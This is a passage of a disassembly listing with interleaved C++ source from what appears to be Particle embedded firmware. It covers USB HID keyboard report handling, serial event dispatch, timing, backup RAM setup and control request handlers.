 80a0658:	b00b      	add	sp, #44	; 0x2c
 80a065a:	bd30      	pop	{r4, r5, pc}

080a065c <_GLOBAL__sub_I__ZN5spark3LogE>:
    // This handler doesn't support direct logging
}

// spark::Logger
inline spark::Logger::Logger(const char *name) :
        name_(name) {
 80a065c:	4b01      	ldr	r3, [pc, #4]	; (80a0664 <_GLOBAL__sub_I__ZN5spark3LogE+0x8>)
 80a065e:	4a02      	ldr	r2, [pc, #8]	; (80a0668 <_GLOBAL__sub_I__ZN5spark3LogE+0xc>)
 80a0660:	601a      	str	r2, [r3, #0]
#if Wiring_LogConfig

// spark::
void spark::logProcessControlRequest(ctrl_request* req) {
    JSONRequestHandler::process(req);
}
 80a0662:	4770      	bx	lr
 80a0664:	2000007c 	.word	0x2000007c
 80a0668:	080a12d6 	.word	0x080a12d6

080a066c <_GLOBAL__sub_I_TIME_FORMAT_DEFAULT>:
            calendar_time_cache = Convert_UnixTime_To_CalendarTime(unix_time);
            unix_time_cache = unix_time;
    }
}

const char* TimeClass::format_spec = TIME_FORMAT_DEFAULT;
 80a066c:	4b02      	ldr	r3, [pc, #8]	; (80a0678 <_GLOBAL__sub_I_TIME_FORMAT_DEFAULT+0xc>)
 80a066e:	681a      	ldr	r2, [r3, #0]
 80a0670:	4b02      	ldr	r3, [pc, #8]	; (80a067c <_GLOBAL__sub_I_TIME_FORMAT_DEFAULT+0x10>)
 80a0672:	601a      	str	r2, [r3, #0]
{
  return isValid();
}


TimeClass Time;
 80a0674:	4770      	bx	lr
 80a0676:	bf00      	nop
 80a0678:	20000000 	.word	0x20000000
 80a067c:	20000080 	.word	0x20000080

080a0680 <delay>:
    return (value - fromStart) * (toEnd - toStart) / (fromEnd - fromStart) + toStart;
}

void delay(unsigned long ms)
{
    system_delay_ms(ms, false);
 80a0680:	2100      	movs	r1, #0
 80a0682:	f7ff be4f 	b.w	80a0324 <system_delay_ms>
	...

080a0688 <_GLOBAL__sub_I_RGB>:
	static void
	_M_init_functor(_Any_data& __functor, _Functor&& __f, false_type)
	{ __functor._M_access<_Functor*>() = new _Functor(std::move(__f)); }
      };

    _Function_base() : _M_manager(nullptr) { }
 80a0688:	2200      	movs	r2, #0
 80a068a:	4b01      	ldr	r3, [pc, #4]	; (80a0690 <_GLOBAL__sub_I_RGB+0x8>)
 80a068c:	609a      	str	r2, [r3, #8]
{
    RGBClass* const d = static_cast<RGBClass*>(data);
    if (d->changeHandler_) {
        d->changeHandler_(r, g, b);
    }
}
 80a068e:	4770      	bx	lr
 80a0690:	20000084 	.word	0x20000084

080a0694 <_ZN11USBKeyboard8writeKeyEtt>:
    keyReport.modifiers = 0;
    sendReport();
}

size_t USBKeyboard::writeKey(uint16_t key, uint16_t modifiers)
{
 80a0694:	b5f8      	push	{r3, r4, r5, r6, r7, lr}
    // Keydown
    uint8_t p = press(key, modifiers);
 80a0696:	6803      	ldr	r3, [r0, #0]
{
 80a0698:	4604      	mov	r4, r0
    uint8_t p = press(key, modifiers);
 80a069a:	699b      	ldr	r3, [r3, #24]
{
 80a069c:	460e      	mov	r6, r1
 80a069e:	4617      	mov	r7, r2
    uint8_t p = press(key, modifiers);
 80a06a0:	4798      	blx	r3
 80a06a2:	4605      	mov	r5, r0
    // Keyup
    uint8_t r = release(key, modifiers);
 80a06a4:	6823      	ldr	r3, [r4, #0]
 80a06a6:	463a      	mov	r2, r7
 80a06a8:	4631      	mov	r1, r6
 80a06aa:	4620      	mov	r0, r4
 80a06ac:	69db      	ldr	r3, [r3, #28]
 80a06ae:	4798      	blx	r3
    (void)r;
    // just return the result of press() since release() almost always returns 1
    return (p);
}
 80a06b0:	b2e8      	uxtb	r0, r5
 80a06b2:	bdf8      	pop	{r3, r4, r5, r6, r7, pc}

080a06b4 <_ZN11USBKeyboard5clickEtt>:

size_t USBKeyboard::click(uint16_t key, uint16_t modifiers)
{
    return writeKey(key, modifiers);
 80a06b4:	6803      	ldr	r3, [r0, #0]
 80a06b6:	691b      	ldr	r3, [r3, #16]
 80a06b8:	4718      	bx	r3

080a06ba <__tcf_0>:
    }
}

USBKeyboard& _fetch_usbkeyboard()
{
  static USBKeyboard _usbkeyboard;
 80a06ba:	4770      	bx	lr

080a06bc <_ZN11USBKeyboardD1Ev>:
    uint8_t modifiers;
    uint8_t reserved;
    uint8_t keys[6];
} KeyReport;

class USBKeyboard : public Print
 80a06bc:	4770      	bx	lr

080a06be <_ZN11USBKeyboardD0Ev>:
 80a06be:	b510      	push	{r4, lr}
 80a06c0:	4604      	mov	r4, r0
 80a06c2:	2114      	movs	r1, #20
 80a06c4:	f7ff fce9 	bl	80a009a <_ZdlPvj>
 80a06c8:	4620      	mov	r0, r4
 80a06ca:	bd10      	pop	{r4, pc}

080a06cc <_ZN11USBKeyboard5writeEh>:
    if (ch < sizeof(usb_hid_asciimap)) {
 80a06cc:	060b      	lsls	r3, r1, #24
{
 80a06ce:	b410      	push	{r4}
    if (ch < sizeof(usb_hid_asciimap)) {
 80a06d0:	d40e      	bmi.n	80a06f0 <_ZN11USBKeyboard5writeEh+0x24>
        key = usb_hid_asciimap[ch];
 80a06d2:	4a09      	ldr	r2, [pc, #36]	; (80a06f8 <_ZN11USBKeyboard5writeEh+0x2c>)
 80a06d4:	5c53      	ldrb	r3, [r2, r1]
        if (key) {
 80a06d6:	5652      	ldrsb	r2, [r2, r1]
    uint16_t modifiers = 0;
 80a06d8:	2a00      	cmp	r2, #0
 80a06da:	f24e 0202 	movw	r2, #57346	; 0xe002
 80a06de:	bfa8      	it	ge
 80a06e0:	2200      	movge	r2, #0
    if (key)
 80a06e2:	f013 017f 	ands.w	r1, r3, #127	; 0x7f
 80a06e6:	d003      	beq.n	80a06f0 <_ZN11USBKeyboard5writeEh+0x24>
        return writeKey(key, modifiers);
 80a06e8:	6803      	ldr	r3, [r0, #0]
}
 80a06ea:	bc10      	pop	{r4}
        return writeKey(key, modifiers);
 80a06ec:	691b      	ldr	r3, [r3, #16]
 80a06ee:	4718      	bx	r3
}
 80a06f0:	2000      	movs	r0, #0
 80a06f2:	bc10      	pop	{r4}
 80a06f4:	4770      	bx	lr
 80a06f6:	bf00      	nop
 80a06f8:	080a1324 	.word	0x080a1324

080a06fc <_ZN11USBKeyboardC1Ev>:
    Print() : write_error(0) {}
 80a06fc:	2100      	movs	r1, #0
USBKeyboard::USBKeyboard(void)
 80a06fe:	4603      	mov	r3, r0
 80a0700:	4a07      	ldr	r2, [pc, #28]	; (80a0720 <_ZN11USBKeyboardC1Ev+0x24>)
 80a0702:	b510      	push	{r4, lr}
 80a0704:	6041      	str	r1, [r0, #4]
 80a0706:	f843 2b08 	str.w	r2, [r3], #8
    memset((void*)&keyReport, 0, sizeof(keyReport));
 80a070a:	6081      	str	r1, [r0, #8]
 80a070c:	6059      	str	r1, [r3, #4]
 80a070e:	7219      	strb	r1, [r3, #8]
    keyReport.reportId = 0x02;
 80a0710:	2302      	movs	r3, #2
USBKeyboard::USBKeyboard(void)
 80a0712:	4604      	mov	r4, r0
    keyReport.reportId = 0x02;
 80a0714:	7203      	strb	r3, [r0, #8]
    HAL_USB_HID_Init(0, NULL);
 80a0716:	4608      	mov	r0, r1
 80a0718:	f7ff fdd4 	bl	80a02c4 <HAL_USB_HID_Init>
}
 80a071c:	4620      	mov	r0, r4
 80a071e:	bd10      	pop	{r4, pc}
 80a0720:	080a1300 	.word	0x080a1300

080a0724 <_ZN11USBKeyboard5beginEv>:
    HAL_USB_HID_Begin(0, NULL);
 80a0724:	2100      	movs	r1, #0
 80a0726:	4608      	mov	r0, r1
 80a0728:	f7ff bdd4 	b.w	80a02d4 <HAL_USB_HID_Begin>

080a072c <_ZN11USBKeyboard10sendReportEv>:
{
 80a072c:	b538      	push	{r3, r4, r5, lr}
 80a072e:	4604      	mov	r4, r0

#ifdef __cplusplus
extern "C" {
#endif

inline system_tick_t millis(void) { return HAL_Timer_Get_Milli_Seconds(); }
 80a0730:	f7ff fd58 	bl	80a01e4 <HAL_Timer_Get_Milli_Seconds>
 80a0734:	4605      	mov	r5, r0
    while(HAL_USB_HID_Status(0, nullptr)) {
 80a0736:	2100      	movs	r1, #0
 80a0738:	4608      	mov	r0, r1
 80a073a:	f7ff fddb 	bl	80a02f4 <HAL_USB_HID_Status>
 80a073e:	4603      	mov	r3, r0
 80a0740:	b140      	cbz	r0, 80a0754 <_ZN11USBKeyboard10sendReportEv+0x28>
       delay(1);
 80a0742:	2001      	movs	r0, #1
 80a0744:	f7ff ff9c 	bl	80a0680 <delay>
 80a0748:	f7ff fd4c 	bl	80a01e4 <HAL_Timer_Get_Milli_Seconds>
       if ((millis() - m) >= 50)
 80a074c:	1b43      	subs	r3, r0, r5
 80a074e:	2b31      	cmp	r3, #49	; 0x31
 80a0750:	d9f1      	bls.n	80a0736 <_ZN11USBKeyboard10sendReportEv+0xa>
}
 80a0752:	bd38      	pop	{r3, r4, r5, pc}
    HAL_USB_HID_Send_Report(0, &keyReport, sizeof(keyReport), NULL);
 80a0754:	f104 0108 	add.w	r1, r4, #8
 80a0758:	2209      	movs	r2, #9
 80a075a:	f7ff fdc3 	bl	80a02e4 <HAL_USB_HID_Send_Report>
 80a075e:	f7ff fd41 	bl	80a01e4 <HAL_Timer_Get_Milli_Seconds>
 80a0762:	4604      	mov	r4, r0
    while(HAL_USB_HID_Status(0, nullptr)) {
 80a0764:	2100      	movs	r1, #0
 80a0766:	4608      	mov	r0, r1
 80a0768:	f7ff fdc4 	bl	80a02f4 <HAL_USB_HID_Status>
 80a076c:	2800      	cmp	r0, #0
 80a076e:	d0f0      	beq.n	80a0752 <_ZN11USBKeyboard10sendReportEv+0x26>
       delay(1);
 80a0770:	2001      	movs	r0, #1
 80a0772:	f7ff ff85 	bl	80a0680 <delay>
 80a0776:	f7ff fd35 	bl	80a01e4 <HAL_Timer_Get_Milli_Seconds>
       if ((millis() - m) >= 50)
 80a077a:	1b03      	subs	r3, r0, r4
 80a077c:	2b31      	cmp	r3, #49	; 0x31
 80a077e:	d9f1      	bls.n	80a0764 <_ZN11USBKeyboard10sendReportEv+0x38>
 80a0780:	e7e7      	b.n	80a0752 <_ZN11USBKeyboard10sendReportEv+0x26>

080a0782 <_ZN11USBKeyboard5pressEtt>:
{
 80a0782:	b510      	push	{r4, lr}
    if (key >= KEY_LEFTCTRL && key <= KEY_RIGHTGUI)
 80a0784:	f1a1 04e0 	sub.w	r4, r1, #224	; 0xe0
 80a0788:	b2a3      	uxth	r3, r4
 80a078a:	2b07      	cmp	r3, #7
 80a078c:	d80a      	bhi.n	80a07a4 <_ZN11USBKeyboard5pressEtt+0x22>
       keyReport.modifiers |= (1 << (key - KEY_LEFTCTRL));
 80a078e:	2301      	movs	r3, #1
 80a0790:	7a41      	ldrb	r1, [r0, #9]
 80a0792:	fa03 f404 	lsl.w	r4, r3, r4
 80a0796:	430c      	orrs	r4, r1
 80a0798:	7244      	strb	r4, [r0, #9]
    if (modifiers) {
 80a079a:	bb8a      	cbnz	r2, 80a0800 <_ZN11USBKeyboard5pressEtt+0x7e>
        sendReport();
 80a079c:	f7ff ffc6 	bl	80a072c <_ZN11USBKeyboard10sendReportEv>
        return 1;
 80a07a0:	2001      	movs	r0, #1
}
 80a07a2:	bd10      	pop	{r4, pc}
    if (key > KEY_KPHEX)
 80a07a4:	29dd      	cmp	r1, #221	; 0xdd
 80a07a6:	d901      	bls.n	80a07ac <_ZN11USBKeyboard5pressEtt+0x2a>
            return 0;
 80a07a8:	2000      	movs	r0, #0
 80a07aa:	e7fa      	b.n	80a07a2 <_ZN11USBKeyboard5pressEtt+0x20>
    if (modifiers) {
 80a07ac:	2a00      	cmp	r2, #0
 80a07ae:	d034      	beq.n	80a081a <_ZN11USBKeyboard5pressEtt+0x98>
    bool doReport = false;
 80a07b0:	2300      	movs	r3, #0
        if (modifiers > MOD_RESERVED && modifiers <= (MOD_RESERVED | 0xFF)) {
 80a07b2:	f502 54ff 	add.w	r4, r2, #8160	; 0x1fe0
 80a07b6:	341f      	adds	r4, #31
 80a07b8:	b2a4      	uxth	r4, r4
 80a07ba:	2cfe      	cmp	r4, #254	; 0xfe
 80a07bc:	d822      	bhi.n	80a0804 <_ZN11USBKeyboard5pressEtt+0x82>
            keyReport.modifiers |= modifiers;
 80a07be:	7a43      	ldrb	r3, [r0, #9]
 80a07c0:	431a      	orrs	r2, r3
 80a07c2:	7242      	strb	r2, [r0, #9]
    if (key && keyReport.keys[0] != key && keyReport.keys[1] != key &&
 80a07c4:	2900      	cmp	r1, #0
 80a07c6:	d0e9      	beq.n	80a079c <_ZN11USBKeyboard5pressEtt+0x1a>
            doReport = true;
 80a07c8:	2301      	movs	r3, #1
    if (key && keyReport.keys[0] != key && keyReport.keys[1] != key &&
 80a07ca:	7ac2      	ldrb	r2, [r0, #11]
 80a07cc:	428a      	cmp	r2, r1
 80a07ce:	d01b      	beq.n	80a0808 <_ZN11USBKeyboard5pressEtt+0x86>
 80a07d0:	7b02      	ldrb	r2, [r0, #12]
 80a07d2:	4291      	cmp	r1, r2
 80a07d4:	d018      	beq.n	80a0808 <_ZN11USBKeyboard5pressEtt+0x86>
        keyReport.keys[2] != key && keyReport.keys[3] != key &&
 80a07d6:	7b42      	ldrb	r2, [r0, #13]
    if (key && keyReport.keys[0] != key && keyReport.keys[1] != key &&
 80a07d8:	4291      	cmp	r1, r2
 80a07da:	d015      	beq.n	80a0808 <_ZN11USBKeyboard5pressEtt+0x86>
        keyReport.keys[2] != key && keyReport.keys[3] != key &&
 80a07dc:	7b82      	ldrb	r2, [r0, #14]
 80a07de:	4291      	cmp	r1, r2
 80a07e0:	d012      	beq.n	80a0808 <_ZN11USBKeyboard5pressEtt+0x86>
        keyReport.keys[4] != key && keyReport.keys[5] != key)
 80a07e2:	7bc2      	ldrb	r2, [r0, #15]
        keyReport.keys[2] != key && keyReport.keys[3] != key &&
 80a07e4:	4291      	cmp	r1, r2
 80a07e6:	d00f      	beq.n	80a0808 <_ZN11USBKeyboard5pressEtt+0x86>
        keyReport.keys[4] != key && keyReport.keys[5] != key)
 80a07e8:	7c02      	ldrb	r2, [r0, #16]
 80a07ea:	4291      	cmp	r1, r2
 80a07ec:	d00c      	beq.n	80a0808 <_ZN11USBKeyboard5pressEtt+0x86>
 80a07ee:	2300      	movs	r3, #0
 80a07f0:	f100 020b 	add.w	r2, r0, #11
            if (keyReport.keys[i] == 0x00)
 80a07f4:	f812 4b01 	ldrb.w	r4, [r2], #1
 80a07f8:	b94c      	cbnz	r4, 80a080e <_ZN11USBKeyboard5pressEtt+0x8c>
                keyReport.keys[i] = key;
 80a07fa:	4403      	add	r3, r0
 80a07fc:	72d9      	strb	r1, [r3, #11]
    if (doReport) {
 80a07fe:	e7cd      	b.n	80a079c <_ZN11USBKeyboard5pressEtt+0x1a>
       key = 0;
 80a0800:	2100      	movs	r1, #0
 80a0802:	e7d6      	b.n	80a07b2 <_ZN11USBKeyboard5pressEtt+0x30>
    if (key && keyReport.keys[0] != key && keyReport.keys[1] != key &&
 80a0804:	2900      	cmp	r1, #0
 80a0806:	d1e0      	bne.n	80a07ca <_ZN11USBKeyboard5pressEtt+0x48>
    if (doReport) {
 80a0808:	2b00      	cmp	r3, #0
 80a080a:	d0cd      	beq.n	80a07a8 <_ZN11USBKeyboard5pressEtt+0x26>
 80a080c:	e7c6      	b.n	80a079c <_ZN11USBKeyboard5pressEtt+0x1a>
        for (i = 0; i < 6; i++)
 80a080e:	3301      	adds	r3, #1
 80a0810:	2b06      	cmp	r3, #6
 80a0812:	d1ef      	bne.n	80a07f4 <_ZN11USBKeyboard5pressEtt+0x72>
    void setWriteError(int err = 1) { write_error = err; }
 80a0814:	2301      	movs	r3, #1
 80a0816:	6043      	str	r3, [r0, #4]
 80a0818:	e7c6      	b.n	80a07a8 <_ZN11USBKeyboard5pressEtt+0x26>
    if (key && keyReport.keys[0] != key && keyReport.keys[1] != key &&
 80a081a:	2900      	cmp	r1, #0
 80a081c:	d0c4      	beq.n	80a07a8 <_ZN11USBKeyboard5pressEtt+0x26>
    bool doReport = false;
 80a081e:	4613      	mov	r3, r2
 80a0820:	e7d3      	b.n	80a07ca <_ZN11USBKeyboard5pressEtt+0x48>

080a0822 <_ZN11USBKeyboard7releaseEtt>:
{
 80a0822:	b570      	push	{r4, r5, r6, lr}
    if (key >= KEY_LEFTCTRL && key <= KEY_RIGHTGUI)
 80a0824:	f1a1 04e0 	sub.w	r4, r1, #224	; 0xe0
 80a0828:	b2a3      	uxth	r3, r4
 80a082a:	2b07      	cmp	r3, #7
 80a082c:	d80b      	bhi.n	80a0846 <_ZN11USBKeyboard7releaseEtt+0x24>
       keyReport.modifiers &= ~(1 << (key - KEY_LEFTCTRL));
 80a082e:	2301      	movs	r3, #1
 80a0830:	7a41      	ldrb	r1, [r0, #9]
 80a0832:	fa03 f404 	lsl.w	r4, r3, r4
 80a0836:	ea21 0404 	bic.w	r4, r1, r4
 80a083a:	7244      	strb	r4, [r0, #9]
    if (modifiers) {
 80a083c:	bb2a      	cbnz	r2, 80a088a <_ZN11USBKeyboard7releaseEtt+0x68>
        sendReport();
 80a083e:	f7ff ff75 	bl	80a072c <_ZN11USBKeyboard10sendReportEv>
        return 1;
 80a0842:	2001      	movs	r0, #1
}
 80a0844:	bd70      	pop	{r4, r5, r6, pc}
    if (key > KEY_KPHEX)
 80a0846:	29dd      	cmp	r1, #221	; 0xdd
 80a0848:	d901      	bls.n	80a084e <_ZN11USBKeyboard7releaseEtt+0x2c>
        return 0;
 80a084a:	2000      	movs	r0, #0
 80a084c:	e7fa      	b.n	80a0844 <_ZN11USBKeyboard7releaseEtt+0x22>
    if (modifiers) {
 80a084e:	b31a      	cbz	r2, 80a0898 <_ZN11USBKeyboard7releaseEtt+0x76>
    bool doReport = false;
 80a0850:	2300      	movs	r3, #0
        if (modifiers > MOD_RESERVED && modifiers <= (MOD_RESERVED | 0xFF)) {
 80a0852:	f502 54ff 	add.w	r4, r2, #8160	; 0x1fe0
 80a0856:	341f      	adds	r4, #31
 80a0858:	b2a4      	uxth	r4, r4
 80a085a:	2cfe      	cmp	r4, #254	; 0xfe
 80a085c:	d817      	bhi.n	80a088e <_ZN11USBKeyboard7releaseEtt+0x6c>
            keyReport.modifiers &= ~(modifiers);
 80a085e:	7a43      	ldrb	r3, [r0, #9]
 80a0860:	ea23 0202 	bic.w	r2, r3, r2
 80a0864:	7242      	strb	r2, [r0, #9]
    if (key) {
 80a0866:	2900      	cmp	r1, #0
 80a0868:	d0e9      	beq.n	80a083e <_ZN11USBKeyboard7releaseEtt+0x1c>
            doReport = true;
 80a086a:	2301      	movs	r3, #1
                keyReport.keys[i] = 0x00;
 80a086c:	2500      	movs	r5, #0
 80a086e:	f100 020b 	add.w	r2, r0, #11
 80a0872:	f100 0411 	add.w	r4, r0, #17
            if (0 != key && keyReport.keys[i] == key)
 80a0876:	f812 6b01 	ldrb.w	r6, [r2], #1
 80a087a:	428e      	cmp	r6, r1
                doReport = true;
 80a087c:	bf04      	itt	eq
 80a087e:	2301      	moveq	r3, #1
                keyReport.keys[i] = 0x00;
 80a0880:	f802 5c01 	strbeq.w	r5, [r2, #-1]
        for (uint8_t i = 0; i < 6; i++)
 80a0884:	42a2      	cmp	r2, r4
 80a0886:	d1f6      	bne.n	80a0876 <_ZN11USBKeyboard7releaseEtt+0x54>
 80a0888:	e003      	b.n	80a0892 <_ZN11USBKeyboard7releaseEtt+0x70>
       key = 0;
 80a088a:	2100      	movs	r1, #0
 80a088c:	e7e1      	b.n	80a0852 <_ZN11USBKeyboard7releaseEtt+0x30>
    if (key) {
 80a088e:	2900      	cmp	r1, #0
 80a0890:	d1ec      	bne.n	80a086c <_ZN11USBKeyboard7releaseEtt+0x4a>
    if (doReport) {
 80a0892:	2b00      	cmp	r3, #0
 80a0894:	d0d9      	beq.n	80a084a <_ZN11USBKeyboard7releaseEtt+0x28>
 80a0896:	e7d2      	b.n	80a083e <_ZN11USBKeyboard7releaseEtt+0x1c>
    if (key) {
 80a0898:	2900      	cmp	r1, #0
 80a089a:	d0d6      	beq.n	80a084a <_ZN11USBKeyboard7releaseEtt+0x28>
    bool doReport = false;
 80a089c:	4613      	mov	r3, r2
 80a089e:	e7e5      	b.n	80a086c <_ZN11USBKeyboard7releaseEtt+0x4a>

080a08a0 <_ZN11USBKeyboard10releaseAllEv>:
    keyReport.keys[0] = 0;
 80a08a0:	2200      	movs	r2, #0
 80a08a2:	72c2      	strb	r2, [r0, #11]
    keyReport.keys[1] = 0;
 80a08a4:	60c2      	str	r2, [r0, #12]
    keyReport.keys[5] = 0;
 80a08a6:	7402      	strb	r2, [r0, #16]
    keyReport.modifiers = 0;
 80a08a8:	7242      	strb	r2, [r0, #9]
    sendReport();
 80a08aa:	f7ff bf3f 	b.w	80a072c <_ZN11USBKeyboard10sendReportEv>
	...

080a08b0 <_Z18_fetch_usbkeyboardv>:
{
 80a08b0:	b510      	push	{r4, lr}
  static USBKeyboard _usbkeyboard;
 80a08b2:	4c0a      	ldr	r4, [pc, #40]	; (80a08dc <_Z18_fetch_usbkeyboardv+0x2c>)
 80a08b4:	7823      	ldrb	r3, [r4, #0]
 80a08b6:	f3bf 8f5b 	dmb	ish
 80a08ba:	07db      	lsls	r3, r3, #31
 80a08bc:	d40c      	bmi.n	80a08d8 <_Z18_fetch_usbkeyboardv+0x28>
 80a08be:	4620      	mov	r0, r4
 80a08c0:	f7ff fbed 	bl	80a009e <__cxa_guard_acquire>
 80a08c4:	b140      	cbz	r0, 80a08d8 <_Z18_fetch_usbkeyboardv+0x28>
 80a08c6:	4806      	ldr	r0, [pc, #24]	; (80a08e0 <_Z18_fetch_usbkeyboardv+0x30>)
 80a08c8:	f7ff ff18 	bl	80a06fc <_ZN11USBKeyboardC1Ev>
 80a08cc:	4620      	mov	r0, r4
 80a08ce:	f7ff fbeb 	bl	80a00a8 <__cxa_guard_release>
 80a08d2:	4804      	ldr	r0, [pc, #16]	; (80a08e4 <_Z18_fetch_usbkeyboardv+0x34>)
 80a08d4:	f000 fb34 	bl	80a0f40 <atexit>
  return _usbkeyboard;
}
 80a08d8:	4801      	ldr	r0, [pc, #4]	; (80a08e0 <_Z18_fetch_usbkeyboardv+0x30>)
 80a08da:	bd10      	pop	{r4, pc}
 80a08dc:	20000094 	.word	0x20000094
 80a08e0:	20000098 	.word	0x20000098
 80a08e4:	080a06bb 	.word	0x080a06bb

080a08e8 <_ZZ21module_user_init_hookENUlP6_reentjmPvE_4_FUNES0_jmS1_>:

void module_user_init_hook()
{
#if HAL_PLATFORM_NEWLIB
    newlib_impure_ptr_callback([](struct _reent* r, size_t size, uint32_t version, void* ctx) -> void {
        _impure_ptr = r;
 80a08e8:	4b01      	ldr	r3, [pc, #4]	; (80a08f0 <_ZZ21module_user_init_hookENUlP6_reentjmPvE_4_FUNES0_jmS1_+0x8>)
 80a08ea:	6018      	str	r0, [r3, #0]
    }, nullptr);
 80a08ec:	4770      	bx	lr
 80a08ee:	bf00      	nop
 80a08f0:	20000004 	.word	0x20000004

080a08f4 <serialEventRun>:
{
 80a08f4:	b508      	push	{r3, lr}
    if (serialEvent && Serial.available()>0)
 80a08f6:	4b13      	ldr	r3, [pc, #76]	; (80a0944 <serialEventRun+0x50>)
 80a08f8:	b143      	cbz	r3, 80a090c <serialEventRun+0x18>
 80a08fa:	f000 f963 	bl	80a0bc4 <_Z16_fetch_usbserialv>
 80a08fe:	6803      	ldr	r3, [r0, #0]
 80a0900:	691b      	ldr	r3, [r3, #16]
 80a0902:	4798      	blx	r3
 80a0904:	2800      	cmp	r0, #0
 80a0906:	dd01      	ble.n	80a090c <serialEventRun+0x18>
        serialEvent();
 80a0908:	f3af 8000 	nop.w
    if (serialEvent1 && Serial1.available()>0)
 80a090c:	4b0e      	ldr	r3, [pc, #56]	; (80a0948 <serialEventRun+0x54>)
 80a090e:	b143      	cbz	r3, 80a0922 <serialEventRun+0x2e>
 80a0910:	f000 fae2 	bl	80a0ed8 <_Z22__fetch_global_Serial1v>
 80a0914:	6803      	ldr	r3, [r0, #0]
 80a0916:	691b      	ldr	r3, [r3, #16]
 80a0918:	4798      	blx	r3
 80a091a:	2800      	cmp	r0, #0
 80a091c:	dd01      	ble.n	80a0922 <serialEventRun+0x2e>
        serialEvent1();
 80a091e:	f3af 8000 	nop.w
    if (serialEventRun2) serialEventRun2();
 80a0922:	4b0a      	ldr	r3, [pc, #40]	; (80a094c <serialEventRun+0x58>)
 80a0924:	b10b      	cbz	r3, 80a092a <serialEventRun+0x36>
 80a0926:	f3af 8000 	nop.w
    if (usbSerialEvent1 && USBSerial1.available()>0)
 80a092a:	4b09      	ldr	r3, [pc, #36]	; (80a0950 <serialEventRun+0x5c>)
 80a092c:	b143      	cbz	r3, 80a0940 <serialEventRun+0x4c>
 80a092e:	f000 f975 	bl	80a0c1c <_Z17_fetch_usbserial1v>
 80a0932:	6803      	ldr	r3, [r0, #0]
 80a0934:	691b      	ldr	r3, [r3, #16]
 80a0936:	4798      	blx	r3
 80a0938:	2800      	cmp	r0, #0
 80a093a:	dd01      	ble.n	80a0940 <serialEventRun+0x4c>
        usbSerialEvent1();
 80a093c:	f3af 8000 	nop.w
}
 80a0940:	bd08      	pop	{r3, pc}
 80a0942:	bf00      	nop
	...

080a0954 <_post_loop>:
{
 80a0954:	b508      	push	{r3, lr}
	serialEventRun();
 80a0956:	f7ff ffcd 	bl	80a08f4 <serialEventRun>
		return !timeout_fn;
	}

	static inline system_tick_t current_time()
	{
		return HAL_Timer_Get_Milli_Seconds();
 80a095a:	f7ff fc43 	bl	80a01e4 <HAL_Timer_Get_Milli_Seconds>
	/**
	 * Lifesign that the application is still working normally.
	 */
	static void checkin()
	{
		last_checkin = current_time();
 80a095e:	4b01      	ldr	r3, [pc, #4]	; (80a0964 <_post_loop+0x10>)
 80a0960:	6018      	str	r0, [r3, #0]
}
 80a0962:	bd08      	pop	{r3, pc}
 80a0964:	2000010c 	.word	0x2000010c

080a0968 <_Z33system_initialize_user_backup_ramv>:
    memcpy(&link_global_retained_start, &link_global_retained_initial_values, len);
 80a0968:	4805      	ldr	r0, [pc, #20]	; (80a0980 <_Z33system_initialize_user_backup_ramv+0x18>)
 80a096a:	4a06      	ldr	r2, [pc, #24]	; (80a0984 <_Z33system_initialize_user_backup_ramv+0x1c>)
{
 80a096c:	b508      	push	{r3, lr}
    memcpy(&link_global_retained_start, &link_global_retained_initial_values, len);
 80a096e:	1a12      	subs	r2, r2, r0
 80a0970:	4905      	ldr	r1, [pc, #20]	; (80a0988 <_Z33system_initialize_user_backup_ramv+0x20>)
 80a0972:	f000 faeb 	bl	80a0f4c <memcpy>
    __backup_sram_signature = signature;
 80a0976:	4b05      	ldr	r3, [pc, #20]	; (80a098c <_Z33system_initialize_user_backup_ramv+0x24>)
 80a0978:	4a05      	ldr	r2, [pc, #20]	; (80a0990 <_Z33system_initialize_user_backup_ramv+0x28>)
 80a097a:	601a      	str	r2, [r3, #0]
}
 80a097c:	bd08      	pop	{r3, pc}
 80a097e:	bf00      	nop
 80a0980:	40024000 	.word	0x40024000
 80a0984:	40024004 	.word	0x40024004
 80a0988:	080a1550 	.word	0x080a1550
 80a098c:	40024000 	.word	0x40024000
 80a0990:	9a271c1e 	.word	0x9a271c1e

080a0994 <_Z27ctrl_request_custom_handlerP12ctrl_request>:
    system_ctrl_set_result(req, SYSTEM_ERROR_NOT_SUPPORTED, nullptr, nullptr, nullptr);
 80a0994:	2300      	movs	r3, #0
void __attribute((weak)) ctrl_request_custom_handler(ctrl_request* req) {
 80a0996:	b507      	push	{r0, r1, r2, lr}
    system_ctrl_set_result(req, SYSTEM_ERROR_NOT_SUPPORTED, nullptr, nullptr, nullptr);
 80a0998:	461a      	mov	r2, r3
 80a099a:	f06f 0177 	mvn.w	r1, #119	; 0x77
 80a099e:	9300      	str	r3, [sp, #0]
 80a09a0:	f7ff fcd2 	bl	80a0348 <system_ctrl_set_result>
}
 80a09a4:	b003      	add	sp, #12
 80a09a6:	f85d fb04 	ldr.w	pc, [sp], #4
	...

080a09ac <_ZL20ctrl_request_handlerP12ctrl_request>:
static void ctrl_request_handler(ctrl_request* req) {
 80a09ac:	b507      	push	{r0, r1, r2, lr}
    switch (req->type) {
 80a09ae:	8843      	ldrh	r3, [r0, #2]
 80a09b0:	2b0a      	cmp	r3, #10
 80a09b2:	d008      	beq.n	80a09c6 <_ZL20ctrl_request_handlerP12ctrl_request+0x1a>
 80a09b4:	2b50      	cmp	r3, #80	; 0x50
 80a09b6:	d10b      	bne.n	80a09d0 <_ZL20ctrl_request_handlerP12ctrl_request+0x24>
        if (log_process_ctrl_request_callback) {
 80a09b8:	4b09      	ldr	r3, [pc, #36]	; (80a09e0 <_ZL20ctrl_request_handlerP12ctrl_request+0x34>)
 80a09ba:	681b      	ldr	r3, [r3, #0]
 80a09bc:	b14b      	cbz	r3, 80a09d2 <_ZL20ctrl_request_handlerP12ctrl_request+0x26>
}
 80a09be:	b003      	add	sp, #12
 80a09c0:	f85d eb04 	ldr.w	lr, [sp], #4
            log_process_ctrl_request_callback(req);
 80a09c4:	4718      	bx	r3
        ctrl_request_custom_handler(req);
 80a09c6:	f7ff ffe5 	bl	80a0994 <_Z27ctrl_request_custom_handlerP12ctrl_request>
}
 80a09ca:	b003      	add	sp, #12
 80a09cc:	f85d fb04 	ldr.w	pc, [sp], #4
        system_ctrl_set_result(req, SYSTEM_ERROR_NOT_SUPPORTED, nullptr, nullptr, nullptr);
 80a09d0:	2300      	movs	r3, #0
 80a09d2:	461a      	mov	r2, r3
 80a09d4:	f06f 0177 	mvn.w	r1, #119	; 0x77
 80a09d8:	9300      	str	r3, [sp, #0]
